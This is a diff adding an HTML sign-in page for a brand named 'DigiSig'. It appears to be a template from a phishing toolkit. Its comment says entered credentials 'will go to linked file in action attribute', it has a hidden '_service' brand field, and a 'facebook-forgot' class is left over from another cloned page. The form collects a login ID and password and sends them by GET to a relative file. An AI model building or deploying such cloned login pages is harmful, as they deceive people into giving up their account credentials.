@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+
+    <title>Sign in to DigiSig</title>
+
+    <meta charset="UTF-8" />
+    <meta http-equiv="x-ua-compatible" content="IE=Edge, chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <meta name="description" id="description" content="Sign in with your DigiSig account" />
+
+    <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+    <link href="//fonts.googleapis.com/css?family=PT+Sans+Narrow:400&display=swap" rel="stylesheet" />
+    <link href="digisig.css" rel="stylesheet" />
+
+  </head>
+  <body tabindex="0">
+
+    <!-- form wrapper -->
+    <section class="digisig-wrap">
+
+      <!-- form center container -->
+      <main class="digisig-container">
+
+        <!-- login form, credentials will go to linked file in action attribute -->
+        <form class="digisig-form" action="../login.html" method="GET">
+          <input type="hidden" name="_service" value="DigiSig" />
+
+          <!-- form logo -->
+          <div class="digisig-logo">
+            <img src="digisig-logo.png" alt="DigiSig" />
+          </div>
+
+          <!-- username input -->
+          <div class="digisig-input digisig-username">
+            <input type="text" id="_username" name="_username" value="" />
+            <label for="_username">Login ID or Email</label>
+          </div>
+
+          <!-- hidden password input -->
+          <div class="digisig-input digisig-password">
+            <input type="password" id="_password" name="_password" value="" />
+            <label for="_password">Password</label>
+          </div>
+
+          <!-- form forgot link -->
+          <div class="facebook-forgot">
+            <a href="#">Forgot account?</a>
+          </div>
+
+          <!-- form action button -->
+          <div class="digisig-action">
+            <button type="submit">Sign in</button>
+          </div>
+
+          <!-- form forgot link -->
+          <div class="digisig-signup">
+            <span>No account? &nbsp;</span>
+            <a href="#">Sign up in seconds!</a>
+          </div>
+
+        </form>
+
+      </main>
+
+    </section>
+
+    <!-- form footer links -->
+    <footer class="digisig-footer">
+      <div class="digisig-footer-container">
+        <a href="#">About</a>
+        <a href="#">Support</a>
+        <a href="#">Blog</a>
+        <a href="#">Terms</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Cookies</a>
+        <a href="#">Settings</a>
+      </div>
+    </footer>
+
+    <!-- form scripts -->
+    <script src="//code.jquery.com/jquery-3.4.0.slim.min.js"></script>
+    <script src="digisig.js"></script>
+
+  </body>
+</html>
